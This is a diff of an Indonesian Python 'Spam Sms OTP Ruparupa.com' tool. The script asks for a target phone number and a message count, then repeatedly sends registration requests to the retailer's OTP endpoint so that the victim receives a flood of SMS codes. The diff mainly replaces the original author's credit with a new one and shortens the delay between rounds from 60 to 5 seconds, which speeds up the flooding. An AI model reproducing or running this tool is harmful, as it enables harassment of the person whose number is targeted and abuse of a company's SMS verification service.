@@ -1,7 +1,6 @@
-# CODED : AkasakaID
-# Time : 18/02/2020
-# LIHAT? BOLEH , REKOD? JANGAN 
-# Stay Strong!!
+# Author :FR13NDS
+# github :github.com/FR13NDS666
+# Pesan  :no recode 
 
 import requests,json,time,sys,os
 
@@ -58,14 +57,14 @@ print("""
 |__|__|___|  _|__,|_| |___|  _|__,|
           |_|             |_|      
 
-[+] CODED : AkasakaID
+[+] AUTHOR : FR13NDS
 [+] Spam Sms OTP Ruparupa.com
 
 	""")
 try:
 	nope = input("Ex: 08xxxxxxxxx\nMasukkan nomor target: ")
 	jml = int(input("Jumlah spam: "))
-	dataurl = {"phone":nope,"email":"akasaka1@etlgr.com","action":"register","password":""}
+	dataurl = {"phone":nope,"email":"FR13NDS@etlgr.com","action":"register","password":""}
 	dataurljson = json.dumps(dataurl)
 	dataurl2 = {"phone":nope,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}
 	dataurl2json = json.dumps(dataurl2)
@@ -81,7 +80,7 @@ try:
 			if z == jml:
 				break
 			else:
-				tunggu(60)
+				tunggu(5)
 			z += 1
 		except requests.exceptions.ConnectionError:	
 			print("Koneksi Error!!\nPeriksa Koneksi internet Anda!!")
